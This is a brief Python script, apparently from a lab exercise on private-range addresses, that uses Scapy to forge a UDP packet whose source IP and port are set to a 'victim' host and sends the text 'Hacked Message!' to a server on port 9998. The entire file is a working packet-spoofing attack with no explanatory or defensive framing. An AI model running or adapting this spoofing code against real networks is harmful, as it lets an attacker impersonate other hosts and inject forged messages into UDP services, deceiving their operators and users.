from scapy.all import IP, UDP, send

victim_ip = "192.168.126.130"
server_ip = "192.168.126.128"
victim_port = 33772
server_port = 9998

# Construct the spoofed UDP packet
spoofed_packet = (
    IP(src=victim_ip, dst=server_ip) /
    UDP(sport=victim_port, dport=server_port) /
    "Hacked Message!"
)

# Send the packet
send(spoofed_packet)

print("[+] Spoofed UDP packet sent!")

